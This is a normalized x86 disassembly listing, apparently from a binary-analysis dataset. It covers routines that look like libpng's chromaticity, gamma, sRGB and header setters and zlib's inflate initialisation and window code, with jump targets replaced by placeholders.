pop ebx
retn
test esi esi
je r-xdata
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
push edi
push ebp
push ecx
mov ecx [ esp + 0x24 ]
push edx
mov edx [ esp + 0x24 ]
push ecx
mov ecx [ esp + 0x24 ]
push edx
push ecx
call sub_4373e0
add esp 0x1c
test eax eax
je r-xdata
fild [ esp + 0x10 ]
mov edx [ esp + 0x10 ]
fld [ r--data ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
fdiv st1
or [ esi + 0x8 ] 0x4
mov [ esi + 0x100 ] edx
mov edx [ esp + 0x20 ]
mov [ esi + 0x104 ] eax
mov eax [ esp + 0x24 ]
mov [ esi + 0x108 ] ecx
mov [ esi + 0x10c ] ebx
mov [ esi + 0x110 ] edx
mov [ esi + 0x114 ] eax
mov [ esi + 0x118 ] ebp
mov [ esi + 0x11c ] edi
fxch st1
fstp [ esi + 0x80 ]
fild [ esp + 0x14 ]
fdiv st1
fstp [ esi + 0x84 ]
fild [ esp + 0x18 ]
fdiv st1
fstp [ esi + 0x88 ]
fild [ esp + 0x1c ]
fdiv st1
fstp [ esi + 0x8c ]
fild [ esp + 0x20 ]
fdiv st1
fstp [ esi + 0x90 ]
fild [ esp + 0x24 ]
fdiv st1
fstp [ esi + 0x94 ]
fild [ esp + 0x28 ]
fdiv st1
fstp [ esi + 0x98 ]
fidivr [ esp + 0x2c ]
fstp [ esi + 0x9c ]
sub_43be60
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
retn
test edi edi
je r-xdata
fld [ r--data ]
fld [ esp + 0x8 ]
fcom st1
fnstsw ax
fstp st1
test ah 0x41
jne r-xdata
fst [ edi + 0x28 ]
fld [ r--data ]
fmul st1
fadd [ r--data ]
call sub_4567a0
fldz
or [ edi + 0x8 ] 0x1
fucompp
mov [ edi + 0xfc ] eax
fnstsw ax
test ah 0x44
jpe r-xdata
mov ecx r--data
fstp st0
call sub_43b800
fld [ r--data ]
mov ecx r--data
call sub_43b800
sub_43bed0
push ecx
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
pop ecx
retn
test edi edi
je r-xdata
cmp eax 0x7fffffff
jle r-xdata
test eax eax
jge r-xdata
mov ecx r--data
call sub_43b800
mov eax 0x7fffffff
jmp r-xdata
mov [ esp + 0x4 ] eax
fild [ esp + 0x4 ]
or [ edi + 0x8 ] 0x1
mov [ edi + 0xfc ] eax
fdiv [ r--data ]
fstp [ edi + 0x28 ]
test eax eax
jne r-xdata
mov ecx r--data
call sub_43b800
xor eax eax
mov ecx r--data
call sub_43b800
sub_43bf30
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
retn
test edi edi
je r-xdata
movzx eax [ edi + 0x14 ]
test ax ax
je r-xdata
mov ecx r--data
call sub_43b800
mov ecx 0x100
cmp ax cx
ja r-xdata
push 0x0
push 0x8
push edi
push esi
call sub_436d60
add esp 0x10
mov ecx 0x200
call sub_43b6d0
mov [ esi + 0x1f4 ] eax
test eax eax
jne r-xdata
xor edx edx
xor eax eax
cmp dx [ edi + 0x14 ]
jae r-xdata
mov ecx r--data
call sub_43b800
pop esi
retn
mov edx [ esi + 0x1f4 ]
or [ edi + 0x8 ] 0x40
or [ edi + 0xb8 ] 0x8
mov [ edi + 0x7c ] edx
pop esi
retn
mov edi edi
mov ecx [ esi + 0x1f4 ]
mov dx [ ebx + eax * 2 ]
mov [ ecx + eax * 2 ] dx
movzx ecx [ edi + 0x14 ]
inc eax
cmp eax ecx
jl r-xdata
sub_43bfd0
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
retn
test edi edi
je r-xdata
cmp [ esp + 0x8 ] 0x0
push ebp
mov ebp [ esp + 0x10 ]
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
test ebp ebp
jne r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
cmp ebp [ esi + 0x268 ]
jbe r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esi + 0x264 ]
ja r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
cmp ebp 0x7fffffff
jbe r-xdata
cmp [ esp + 0xc ] 0x7fffffff
ja r-xdata
mov eax [ esp + 0x14 ]
cmp eax 0x1
je r-xdata
mov ecx r--data
call sub_43b800
cmp [ esp + 0xc ] 0x1fffff7e
jbe r-xdata
test ebx ebx
jl r-xdata
cmp eax 0x2
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
cmp ebx 0x1
je r-xdata
cmp eax 0x4
je r-xdata
cmp ebx 0x2
je r-xdata
cmp [ esp + 0x14 ] 0x8
jg r-xdata
cmp ebx 0x5
je r-xdata
cmp eax 0x8
je r-xdata
cmp [ esp + 0x14 ] 0x8
jge r-xdata
cmp ebx 0x4
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
jmp r-xdata
cmp ebx 0x6
jle r-xdata
cmp eax 0x10
je r-xdata
cmp [ esp + 0x18 ] 0x2
jl r-xdata
cmp ebx 0x6
jne r-xdata
cmp [ esp + 0x1c ] 0x0
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
cmp ebx 0x3
jne r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
mov ebp 0x1000
test [ esi + 0x68 ] ebp
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
cmp [ esi + 0x230 ] 0x0
je r-xdata
mov al [ esp + 0x1c ]
mov edx [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov [ edi + 0x1a ] al
mov al [ esp + 0x20 ]
mov [ edi + 0x4 ] edx
mov dl [ esp + 0x14 ]
mov [ edi + 0x1b ] al
mov al [ esp + 0x18 ]
mov [ edi ] ecx
mov [ edi + 0x18 ] dl
mov [ edi + 0x19 ] bl
mov [ edi + 0x1c ] al
pop ebp
cmp bl 0x3
je r-xdata
test [ esi + 0x230 ] 0x4
je r-xdata
mov ecx r--data
call sub_43b800
mov [ edi + 0x1d ] 0x1
test bl 0x2
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
cmp eax 0x40
jne r-xdata
mov al [ edi + 0x1d ]
imul dl
mov [ edi + 0x1e ] al
cmp ecx 0x1fffff7e
jbe r-xdata
inc [ edi + 0x1d ]
mov [ edi + 0x1d ] 0x3
jmp r-xdata
mov ecx r--data
call sub_43b800
test [ esi + 0x68 ] ebp
jne r-xdata
cmp al 0x8
movzx eax al
jb r-xdata
mov [ edi + 0xc ] 0x0
pop esi
retn
test bl 0x4
je r-xdata
cmp ebx 0x2
je r-xdata
imul eax ecx
add eax 0x7
shr eax 0x3
mov [ edi + 0xc ] eax
shr eax 0x3
imul eax ecx
mov [ edi + 0xc ] eax
pop esi
retn
test [ esi + 0x68 ] ebp
je r-xdata
cmp ebx 0x6
je r-xdata
sub_43c1e0
push ebp
mov ebp [ esp + 0x8 ]
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
test edi edi
je r-xdata
mov eax ebp
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push ebx
lea ebx [ eax + 0x1 ]
mov ecx ebx
call sub_43b6d0
mov [ edi + 0xa0 ] eax
test eax eax
jne r-xdata
push ebx
push ebp
push eax
call sub_443790
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x24 ]
mov dl [ esp + 0x28 ]
mov ebx [ esp + 0x2c ]
mov [ edi + 0xa4 ] eax
mov eax [ esp + 0x30 ]
mov [ edi + 0xa8 ] ecx
add esp 0xc
mov [ edi + 0xb4 ] dl
mov [ edi + 0xb5 ] bl
lea ecx [ eax + 0x1 ]
mov ecx r--data
call sub_43b800
pop ebx
pop esi
pop ebp
retn
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
lea ebp [ eax + 0x1 ]
mov ecx ebp
call sub_43b6d0
mov [ edi + 0xac ] eax
test eax eax
jne r-xdata
mov ecx [ esp + 0x24 ]
push ebp
push ecx
push eax
call sub_443790
lea ebp [ ebx * 4 + 0x4 ]
add esp 0xc
mov ecx ebp
call sub_43b6d0
mov [ edi + 0xb0 ] eax
test eax eax
jne r-xdata
mov ecx r--data
call sub_43b800
pop ebx
pop esi
pop ebp
retn
push ebp
push 0x0
push eax
call sub_443360
add esp 0xc
xor ebp ebp
test ebx ebx
jle r-xdata
mov ecx r--data
call sub_43b800
pop ebx
pop esi
pop ebp
retn
or [ edi + 0x8 ] 0x400
or [ edi + 0xb8 ] 0x80
pop ebx
jmp r-xdata
mov edx [ esp + 0x28 ]
mov eax [ edx + ebp * 4 ]
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea ebx [ eax + 0x1 ]
mov ecx ebx
call sub_43b6d0
mov ecx [ edi + 0xb0 ]
mov [ ecx + ebp * 4 ] eax
mov edx [ edi + 0xb0 ]
cmp [ edx + ebp * 4 ] 0x0
lea eax [ edx + ebp * 4 ]
je r-xdata
mov ecx r--data
call sub_43b800
pop ebx
pop esi
pop ebp
retn
mov ecx [ esp + 0x28 ]
mov edx [ ecx + ebp * 4 ]
mov eax [ eax ]
push ebx
push edx
push eax
call sub_443790
inc ebp
add esp 0xc
cmp ebp [ esp + 0x20 ]
jl r-xdata
sub_43c360
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
retn
test edi edi
je r-xdata
test ebx ebx
jl r-xdata
cmp [ edi + 0x19 ] 0x3
mov ecx r--data
jne r-xdata
cmp ebx 0x100
jle r-xdata
call sub_43b800
push esi
call sub_43b740
add esp 0x4
push ebp
push 0x0
push 0x1000
push edi
push esi
call sub_436d60
mov eax [ esi + 0x248 ]
add esp 0x10
push 0x300
test eax eax
je r-xdata
call sub_441c3d
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
push 0x300
push 0x0
push ebp
mov [ esi + 0x114 ] ebp
call sub_443360
mov ecx [ esp + 0x18 ]
mov edx [ esi + 0x114 ]
lea eax [ ebx + ebx * 2 ]
push eax
push ecx
push edx
call sub_443790
mov eax [ esi + 0x114 ]
add esp 0x18
mov [ edi + 0x10 ] eax
mov [ esi + 0x118 ] bx
or [ edi + 0xb8 ] 0x1000
or [ edi + 0x8 ] 0x8
pop ebp
mov [ edi + 0x14 ] bx
pop esi
retn
test [ esi + 0x6c ] 0x100000
jne r-xdata
mov ebp eax
test ebp ebp
jne r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
sub_43c440
push ecx
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
mov esi eax
test ebp ebp
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
test esi esi
je r-xdata
mov al [ esp + 0x1c ]
fld [ r--data ]
or [ esi + 0x8 ] 0x800
mov [ esi + 0x2c ] al
sub esp 0x8
mov edi esi
fstp [ esp ]
mov eax ebp
call sub_43be60
mov eax 0xb18f
mov ecx ebp
call sub_43bed0
push 0x1770
push 0x3a98
push 0xea60
push 0x7530
push 0xfa00
push 0x8084
push 0x7a26
mov ebx 0x80e8
mov eax ebp
call sub_4373e0
add esp 0x24
test eax eax
je r-xdata
push 0x1770
push 0x3a98
push 0xea60
push 0x7530
push ebx
push 0xfa00
push 0x8084
push 0x7a26
mov eax ebp
call sub_43bd60
fld [ r--data ]
fstp [ esp + 0x18 ]
sub esp 0x20
fld [ r--data ]
fstp [ esp + 0x30 ]
fld [ r--data ]
fstp [ esp + 0x28 ]
fld [ r--data ]
fstp [ esp + 0x20 ]
fld [ r--data ]
fstp [ esp + 0x18 ]
fld [ r--data ]
fstp [ esp + 0x10 ]
fld [ r--data ]
fstp [ esp + 0x8 ]
fld [ r--data ]
fstp [ esp ]
call sub_43bc60
add esp 0x40
sub_43c550
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
retn
test edi edi
je r-xdata
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push ebx
lea ebx [ eax + 0x1 ]
push ebp
mov ecx ebx
call sub_43b6d0
mov ebp eax
test ebp ebp
jne r-xdata
mov eax [ esp + 0x10 ]
push ebx
push eax
push ebp
call sub_443790
mov ecx [ esp + 0x28 ]
add esp 0xc
call sub_43b6d0
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx r--data
call sub_43b800
pop ebp
pop ebx
pop esi
retn
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
push ecx
push edx
push ebx
call sub_443790
push 0x0
push 0x10
push edi
push esi
call sub_436d60
mov eax [ esp + 0x38 ]
mov cl [ esp + 0x30 ]
or [ edi + 0xb8 ] 0x10
add esp 0x1c
or [ edi + 0x8 ] 0x1000
mov [ edi + 0xc4 ] ebp
pop ebp
mov [ edi + 0xc8 ] ebx
mov [ edi + 0xcc ] eax
mov [ edi + 0xd0 ] cl
pop ebx
mov edx ebp
mov ecx esi
call sub_43b6a0
mov ecx r--data
call sub_43b800
pop ebp
pop ebx
pop esi
retn
sub_43c630
sub esp 0x8
push ebx
push esi
mov esi [ esp + 0x14 ]
test esi esi
je r-xdata
pop esi
xor eax eax
pop ebx
add esp 0x8
retn
mov ebx [ esp + 0x18 ]
test ebx ebx
je r-xdata
mov eax [ ebx + 0x30 ]
push ebp
push edi
mov edi [ ebx + 0x34 ]
inc eax
cmp eax edi
jle r-xdata
mov esi [ esp + 0x24 ]
add esi 0x8
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x10 ] esi
mov ebp [ ebx + 0x38 ]
test ebp ebp
je r-xdata
mov eax [ esp + 0x14 ]
inc eax
add esi 0x10
cmp eax 0x1
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] esi
jl r-xdata
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov [ ebx + 0x34 ] 0x9
mov ecx [ ebx + 0x34 ]
shl ecx 0x4
mov [ ebx + 0x30 ] 0x0
call sub_43b6d0
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
lea ecx [ eax + 0x8 ]
mov [ ebx + 0x34 ] ecx
shl ecx 0x4
call sub_43b6d0
mov [ ebx + 0x38 ] eax
test eax eax
jne r-xdata
mov edi [ ebx + 0x30 ]
mov eax [ esi - 0x4 ]
shl edi 0x4
add edi [ ebx + 0x38 ]
test eax eax
je r-xdata
pop edi
pop ebp
pop esi
xor eax eax
pop ebx
add esp 0x8
retn
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ esi - 0x8 ]
sub eax edx
mov ebp eax
test ecx ecx
jg r-xdata
pop edi
pop ebp
pop esi
mov eax 0x1
pop ebx
add esp 0x8
retn
or [ ebx + 0xb8 ] 0x4000
shl edi 0x4
push edi
push ebp
push eax
call sub_443790
add esp 0xc
mov edx ebp
mov ecx esi
call sub_43b6a0
jmp r-xdata
mov edx ebp
mov ecx esi
call sub_43b6a0
mov esi [ esp + 0x1c ]
mov ecx r--data
call sub_43b800
mov esi [ esi ]
test esi esi
je r-xdata
xor ebx ebx
mov [ edi ] 0xffffffff
cmp [ esi ] 0x0
je r-xdata
mov esi [ esp + 0x10 ]
mov ecx [ esi - 0x4 ]
push ebp
push ecx
push eax
call sub_443790
mov edx [ edi + 0x4 ]
mov [ edx + ebp ] 0x0
mov eax [ edi + 0x4 ]
add esp 0xc
lea ebp [ eax + ebp + 0x1 ]
mov [ edi + 0x8 ] ebp
test ebx ebx
je r-xdata
mov ebx esi
lea edx [ ebx + 0x1 ]
mov edx [ edi + 0x8 ]
mov eax [ esp + 0x20 ]
mov [ ebx + edx ] 0x0
mov [ edi + 0xc ] ebx
inc [ eax + 0x30 ]
mov ebx eax
jmp r-xdata
mov ecx [ esi ]
push ebx
push ecx
push ebp
call sub_443790
add esp 0xc
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
sub ebx edx
mov [ edi ] ecx
jmp r-xdata
mov esi [ esp + 0x10 ]
mov esi [ esp + 0x1c ]
lea ecx [ ebx + ebp + 0x4 ]
call sub_43b6d0
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
sub_43c7e0
push ebp
mov ebp [ esp + 0x10 ]
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
test edi edi
je r-xdata
cmp [ esp + 0xc ] 0x0
push ebx
je r-xdata
mov ebx [ esp + 0x14 ]
push 0x0
push 0x2000
push edi
push esi
call sub_436d60
mov eax [ esi + 0x248 ]
add esp 0x10
push 0x100
test eax eax
je r-xdata
mov [ edi + 0x16 ] bx
test ebx ebx
pop ebx
je r-xdata
movzx ecx [ edi + 0x18 ]
mov eax 0x1
shl eax cl
mov cl [ edi + 0x19 ]
test cl cl
jne r-xdata
call sub_441c3d
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
or [ edi + 0x8 ] 0x10
or [ edi + 0xb8 ] 0x2000
cmp cl 0x2
jne r-xdata
movzx edx [ ebp + 0x8 ]
cmp edx eax
jg r-xdata
mov [ edi + 0x4c ] ebx
mov [ esi + 0x188 ] ebx
mov ebx [ esp + 0x14 ]
lea eax [ ebx - 0x1 ]
cmp eax 0xff
ja r-xdata
test [ esi + 0x6c ] 0x100000
jne r-xdata
mov ebx eax
test ebx ebx
jne r-xdata
mov edx [ ebp ]
mov [ edi + 0x50 ] edx
mov eax [ ebp + 0x4 ]
mov [ edi + 0x54 ] eax
mov cx [ ebp + 0x8 ]
mov [ edi + 0x58 ] cx
test ebx ebx
jne r-xdata
movzx ecx [ ebp + 0x2 ]
cmp ecx eax
jg r-xdata
mov ecx r--data
call sub_43b800
test ebp ebp
je r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ edi + 0x4c ]
push ebx
push ecx
push edx
call sub_443790
add esp 0xc
jmp r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
mov [ esp + 0x14 ] 0x1
mov ebx [ esp + 0x14 ]
movzx edx [ ebp + 0x4 ]
cmp edx eax
jg r-xdata
movzx ecx [ ebp + 0x6 ]
cmp ecx eax
jle r-xdata
sub_43c900
push ecx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ecx
retn
test ebx ebx
je r-xdata
mov ecx [ ebx + 0xd8 ]
inc ecx
push ebp
shl ecx 0x4
call sub_43b6d0
mov ebp eax
mov [ esp + 0x8 ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx + 0xd8 ]
mov ecx [ ebx + 0xd4 ]
shl eax 0x4
push eax
push ecx
push ebp
call sub_443790
mov eax [ ebx + 0xd4 ]
add esp 0xc
test eax eax
je r-xdata
mov ecx r--data
call sub_43b800
pop ebp
pop esi
pop ecx
retn
mov edx [ esp + 0x10 ]
push edi
mov edi [ ebx + 0xd8 ]
mov [ ebx + 0xd4 ] 0x0
mov eax [ edx ]
shl edi 0x4
add edi ebp
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov ecx [ esi + 0x24c ]
push eax
test ecx ecx
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea ebp [ eax + 0x1 ]
mov ecx ebp
call sub_43b6d0
mov [ edi ] eax
test eax eax
jne r-xdata
call sub_44120e
add esp 0x4
push esi
call ecx
add esp 0x8
jmp r-xdata
push ebp
mov ebp [ esp + 0x18 ]
mov ecx [ ebp ]
push ecx
push eax
call sub_443790
mov eax [ ebp + 0xc ]
lea ecx [ eax + eax * 4 ]
add esp 0xc
add ecx ecx
call sub_43b6d0
mov [ edi + 0x8 ] eax
test eax eax
jne r-xdata
mov ecx r--data
call sub_43b800
jmp r-xdata
mov ecx [ ebp + 0xc ]
lea edx [ ecx + ecx * 4 ]
mov ecx [ ebp + 0x8 ]
add edx edx
push edx
push ecx
push eax
call sub_443790
mov edx [ ebp + 0xc ]
mov [ edi + 0xc ] edx
mov al [ ebp + 0x4 ]
add esp 0xc
mov [ edi + 0x4 ] al
mov ecx r--data
call sub_43b800
mov eax [ edi ]
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
inc [ ebx + 0xd8 ]
or [ ebx + 0x8 ] 0x2000
or [ ebx + 0xb8 ] 0x20
pop edi
mov [ ebx + 0xd4 ] ecx
pop ebp
mov [ edi ] 0x0
jmp r-xdata
mov ecx [ esi + 0x24c ]
push eax
test ecx ecx
je r-xdata
call sub_44120e
add esp 0x4
push esi
call ecx
add esp 0x8
mov [ edi ] 0x0
jmp r-xdata
sub_43ca70
push ecx
push ebp
mov ebp [ esp + 0xc ]
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
pop ecx
retn
test ebp ebp
je r-xdata
mov eax [ ebp + 0xc0 ]
inc eax
lea ecx [ eax + eax * 4 ]
add ecx ecx
push edi
add ecx ecx
call sub_43b6d0
mov edi eax
mov [ esp + 0xc ] edi
test edi edi
jne r-xdata
mov eax [ ebp + 0xc0 ]
mov ecx [ ebp + 0xbc ]
lea eax [ eax + eax * 4 ]
add eax eax
add eax eax
push eax
push ecx
push edi
call sub_443790
mov edx [ ebp + 0xbc ]
add esp 0xc
mov ecx esi
call sub_43b6a0
mov eax [ ebp + 0xc0 ]
mov [ ebp + 0xbc ] 0x0
lea edx [ eax + eax * 4 ]
mov eax [ ebx ]
lea edi [ edi + edx * 4 ]
mov [ edi ] eax
mov [ edi + 0x4 ] 0x0
mov edx [ ebx + 0xc ]
mov [ edi + 0xc ] edx
mov al [ esi + 0x68 ]
mov [ edi + 0x10 ] al
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx r--data
call sub_43b800
pop edi
pop esi
pop ebp
pop ecx
retn
mov ecx [ ebx + 0xc ]
call sub_43b6d0
mov [ edi + 0x8 ] eax
test eax eax
jne r-xdata
mov [ edi + 0x8 ] 0x0
jmp r-xdata
mov ecx [ ebx + 0xc ]
mov edx [ ebx + 0x8 ]
push ecx
push edx
push eax
call sub_443790
add esp 0xc
mov ecx r--data
call sub_43b800
mov [ edi + 0xc ] 0x0
jmp r-xdata
mov eax [ esp + 0xc ]
inc [ ebp + 0xc0 ]
or [ ebp + 0xb8 ] 0x200
mov [ ebp + 0xbc ] eax
pop edi
sub_43cb70
xor ecx ecx
cmp edx ecx
je r-xdata
mov eax 0xfffffffe
retn
mov eax [ edx + 0x1c ]
cmp eax ecx
je r-xdata
mov [ eax + 0x1c ] ecx
mov [ edx + 0x14 ] ecx
mov [ edx + 0x8 ] ecx
mov [ edx + 0x18 ] ecx
mov [ edx + 0x30 ] 0x1
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x20 ] ecx
mov [ eax + 0x28 ] ecx
mov [ eax + 0x2c ] ecx
mov [ eax + 0x30 ] ecx
mov [ eax + 0x38 ] ecx
mov [ eax + 0x3c ] ecx
lea ecx [ eax + 0x530 ]
mov [ eax + 0x14 ] 0x8000
mov [ eax + 0x6c ] ecx
mov [ eax + 0x50 ] ecx
mov [ eax + 0x4c ] ecx
xor eax eax
retn
sub_43cbd0
test esi esi
jne r-xdata
cmp [ esi + 0x20 ] 0x0
mov [ esi + 0x18 ] 0x0
jne r-xdata
lea eax [ esi - 0x2 ]
retn
cmp [ esi + 0x24 ] 0x0
jne r-xdata
mov [ esi + 0x20 ] sub_43ebc0
mov [ esi + 0x28 ] 0x0
mov eax [ esi + 0x28 ]
mov ecx [ esi + 0x20 ]
push 0x2530
push 0x1
push eax
call ecx
add esp 0xc
test eax eax
jne r-xdata
mov [ esi + 0x24 ] sub_43ebe0
mov [ esi + 0x1c ] eax
mov [ eax + 0x8 ] 0x1
mov [ eax + 0x24 ] 0xf
mov [ eax + 0x34 ] 0x0
mov edx esi
jmp sub_43cb70
mov eax 0xfffffffc
retn
sub_43cc40
push ebp
push esi
mov esi [ ebx + 0x1c ]
xor ebp ebp
push edi
mov edi eax
cmp [ esi + 0x34 ] ebp
jne r-xdata
cmp [ esi + 0x28 ] ebp
jne r-xdata
mov ecx [ esi + 0x24 ]
mov edx [ ebx + 0x20 ]
mov eax 0x1
shl eax cl
mov ecx [ ebx + 0x28 ]
push 0x1
push eax
push ecx
call edx
add esp 0xc
mov [ esi + 0x34 ] eax
cmp eax ebp
jne r-xdata
sub edi [ ebx + 0x10 ]
mov eax [ esi + 0x28 ]
cmp edi eax
jb r-xdata
mov ecx [ esi + 0x24 ]
mov eax 0x1
shl eax cl
mov [ esi + 0x30 ] ebp
mov [ esi + 0x2c ] ebp
mov [ esi + 0x28 ] eax
pop edi
pop esi
lea eax [ ebp + 0x1 ]
pop ebp
retn
sub eax [ esi + 0x30 ]
mov ebp eax
cmp ebp edi
jbe r-xdata
mov ecx [ ebx + 0xc ]
mov edx [ esi + 0x34 ]
push eax
sub ecx eax
push ecx
push edx
call sub_443790
mov eax [ esi + 0x28 ]
add esp 0xc
pop edi
mov [ esi + 0x30 ] ebp
mov [ esi + 0x2c ] eax
pop esi
xor eax eax
pop ebp
retn
mov ecx [ ebx + 0xc ]
mov edx [ esi + 0x34 ]
add edx [ esi + 0x30 ]
push ebp
sub ecx edi
push ecx
push edx
call sub_443790
add esp 0xc
sub edi ebp
je r-xdata
mov ebp edi
add [ esi + 0x30 ] ebp
mov ecx [ esi + 0x30 ]
mov eax [ esi + 0x28 ]
cmp ecx eax
jne r-xdata
mov eax [ ebx + 0xc ]
mov ecx [ esi + 0x34 ]
push edi
sub eax edi
push eax
push ecx
call sub_443790
mov edx [ esi + 0x28 ]
add esp 0xc
mov [ esi + 0x30 ] edi
pop edi
mov [ esi + 0x2c ] edx
pop esi
xor eax eax
pop ebp
retn
mov ecx [ esi + 0x2c ]
cmp ecx eax
jae r-xdata
mov [ esi + 0x30 ] 0x0
pop edi
pop esi
xor eax eax
pop ebp
retn
add ecx ebp
mov [ esi + 0x2c ] ecx
sub_43cd30
mov eax [ esp + 0x4 ]
sub esp 0x2c
push edi
test eax eax
je r-xdata
mov eax 0xfffffffe
pop edi
add esp 0x2c
retn
mov edi [ eax + 0x1c ]
test edi edi
je r-xdata
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ eax ] 0x0
jne r-xdata
cmp [ edi ] 0xb
jne r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
mov [ esp + 0x14 ] ecx
mov ecx [ eax + 0x10 ]
push ebx
mov ebx [ edi + 0x38 ]
push ebp
mov ebp [ eax ]
mov [ esp + 0x14 ] ecx
mov [ esp + 0x24 ] ecx
mov ecx [ edi ]
push esi
mov esi [ edi + 0x3c ]
mov [ esp + 0x10 ] edx
mov [ esp + 0x38 ] edx
mov [ esp + 0x30 ] 0x0
cmp ecx 0x1c
jbe r-xdata
mov [ edi ] 0xc
jmp [ ecx * 4 + jump_table_43e184 ]
mov eax 0xfffffffe
cmp [ edi + 0x8 ] 0x0
jne r-xdata
cmp esi 0x10
jae r-xdata
cmp esi 0x20
jae r-xdata
cmp esi 0x10
jae r-xdata
test [ edi + 0x10 ] 0x400
je r-xdata
test [ edi + 0x10 ] 0x400
je r-xdata
test [ edi + 0x10 ] 0x800
je r-xdata
test [ edi + 0x10 ] 0x1000
je r-xdata
test [ edi + 0x10 ] 0x200
je r-xdata
cmp esi 0x20
jae r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov ecx esi
and ecx 0x7
sub esi ecx
shr ebx cl
cmp esi 0x20
jae r-xdata
mov eax [ edi + 0x40 ]
mov [ esp + 0x14 ] eax
test eax eax
je r-xdata
cmp esi 0xe
jae r-xdata
mov ecx [ edi + 0x68 ]
cmp ecx [ edi + 0x5c ]
jae r-xdata
mov eax [ edi + 0x64 ]
add eax [ edi + 0x60 ]
cmp [ edi + 0x68 ] eax
jae r-xdata
cmp edx 0x6
jb r-xdata
mov eax [ edi + 0x48 ]
test eax eax
je r-xdata
mov ecx [ edi + 0x58 ]
mov eax 0x1
shl eax cl
dec eax
and eax ebx
mov ecx eax
mov eax [ edi + 0x50 ]
mov eax [ eax + ecx * 4 ]
mov ecx eax
shr ecx 0x8
movzx ecx cl
mov [ esp + 0x14 ] eax
cmp ecx esi
jbe r-xdata
mov eax [ edi + 0x48 ]
test eax eax
je r-xdata
cmp [ esp + 0x18 ] 0x0
je r-xdata
cmp [ esp + 0x18 ] 0x0
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov [ esp + 0x30 ] 0x1
jmp r-xdata
mov [ esp + 0x30 ] 0xfffffffd
pop esi
pop ebp
pop ebx
mov eax 0xfffffffc
pop edi
add esp 0x2c
retn
cmp esi 0x10
jae r-xdata
mov [ edi ] 0xc
jmp r-xdata
mov [ edi + 0x10 ] ebx
cmp bl 0x8
je r-xdata
test edx edx
je r-xdata
mov eax [ edi + 0x20 ]
test eax eax
je r-xdata
nop
mov eax [ edi + 0x20 ]
test eax eax
je r-xdata
lea esp [ esp ]
mov eax [ edi + 0x20 ]
test eax eax
je r-xdata
cmp esi 0x10
jae r-xdata
mov [ edi + 0x40 ] 0x0
mov [ edi ] 0x6
mov ecx [ edi + 0x40 ]
mov [ esp + 0x14 ] ecx
cmp ecx edx
jbe r-xdata
mov eax [ edi + 0x20 ]
test eax eax
je r-xdata
test edx edx
je r-xdata
mov eax [ edi + 0x20 ]
test eax eax
je r-xdata
test edx edx
je r-xdata
mov eax [ edi + 0x20 ]
test eax eax
je r-xdata
cmp esi 0x10
jae r-xdata
mov ecx ebx
and ecx 0xff00
mov eax ebx
